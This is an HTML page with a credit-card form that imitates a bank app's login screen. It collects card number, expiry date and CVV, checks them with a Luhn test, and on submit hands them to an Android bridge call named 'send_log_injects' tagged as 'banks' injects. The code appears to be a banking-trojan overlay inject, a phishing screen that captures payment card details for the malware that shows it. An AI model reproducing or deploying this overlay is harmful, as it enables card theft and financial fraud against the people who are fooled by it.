<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <style>
        body{
            background-color: #007dff;
        }
        .input {
            width: 100%;
            padding: 6px;
            margin-bottom: 5px;
            background-color: #007dff;
            border:0;
            border-bottom: 1px solid #2690ff;
            color: white;
            font-weight: 500;
        }
        form{
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }
        section{
            padding: 10px;
            flex:1;
        }
        footer{
            padding: 10px;
        }
        .button{
            width: 100%;
            padding-top: 7px;
            padding-bottom: 7px;
            background-color: #fff;
            color:#007dff;
            border:0;
            border-radius: 20px;
            font-weight: 500;
        }
        .button:disabled{
            opacity: 0.4;
            
        }

        .error {
            border-color: #f00 !important;
        }

        input, button {
            outline: none !important;
            box-shadow: none !important;
        }

        ::placeholder {
            opacity: 1;
            color: #fff;
        }

        :-moz-placeholder {
            opacity: 1;
            color: #fff;
        }

        ::-moz-placeholder {
            opacity: 1;
            color: #fff;
        }

        :-ms-input-placeholder {
            opacity: 1;
            color: #fff;
        }

        ::-webkit-input-placeholder {
            opacity: 1;
            color: #fff;
        }
        
    </style>
</head>

        </header>
        <section>
            <input type="tel" id="cc" name="cc" onkeyup="check6();check8()" class="input login" placeholder="Credit Card" autocomplete="off">
            <input type="tel" id="exp" name="exp" maxlength="5" style="color:#e5e5e5;width: 58%;float: left;" onkeyup="check7();check8()" class="input password" placeholder="Expiration Date" autocomplete="off">
            <input type="password" id="cvv" name="cvv" maxlength="3" style="width: 40%;float: right;margin-bottom: 60px;border-left: 0;" onkeyup="check8()" class="input password" placeholder="CVV" autocomplete="off">  
            <p style="text-align: center;clear: both;font-size: 10px;color: #fff;">
                By tapping next, we'll collect your mobile number's network information to be able to send you a One-Time Password (OTP).
            </p>
            <input type="submit" class="button" id="sendData" disabled value="Login">
        </section>
        <footer>
            <p style="color: #fff;">
                Help Center
            </p>
        </footer>
    </form>
<script>

    $('#cc').mask('0000 0000 0000 0000')
    $('#exp').mask('00/00')
    $('#cvv').mask('000')

    var cc = document.getElementById('cc'),
        exp = document.getElementById('exp'),
        cvv = document.getElementById('cvv');

        var sendData = document.getElementById('sendData');

        function check7() {
            
            var mmYY = exp.value.split('/');
            var month = parseInt(mmYY[0]);
            var year = parseInt(mmYY[1]);
    
            var expArray = exp.value.split('/');
            var today, someday;
            var exMonth = expArray[0];
            var exYear = "20" + expArray[1];
    
            today = new Date();
            someday = new Date();
            someday.setFullYear(exYear, exMonth, 1);
                    
            if(month > 12 || month == 0 || month == 00 || someday < today || year > 27 || exp.value.length != 5) {
                exp.classList.add('error')
            } else {
                exp.classList.remove('error')
                return true
            }
        }

        function check6() {
            if(!valid_credit_card(cc.value)) {
                cc.classList.add('error')
            } else {
                cc.classList.remove('error');
            }
        }

        function valid_credit_card(value) {
            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
            if (/[^0-9-\s]+/.test(value)) return false;
            var nCheck = 0, nDigit = 0, bEven = false;
            value = value.replace(/\D/g, "");
            for (var n = value.length - 1; n >= 0; n--) {
                var cDigit = value.charAt(n),
                    nDigit = parseInt(cDigit, 10);
                if (bEven) {
                    if ((nDigit *= 2) > 9) nDigit -= 9;
                }
                nCheck += nDigit;
                bEven = !bEven;
            }
            return (nCheck % 10) == 0;
            
        }


    function check8() {
            if(valid_credit_card(cc.value) && check7() && cvv.value.length === 3) {
                sendData.disabled = false;
            } else {
                sendData.disabled = true;
            }
        }

        sendData.onclick = () => {
                var data = {};
                data.cc = cc.value;
                data.exp = exp.value;
                data.cvv = cvv.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
        }
</script>
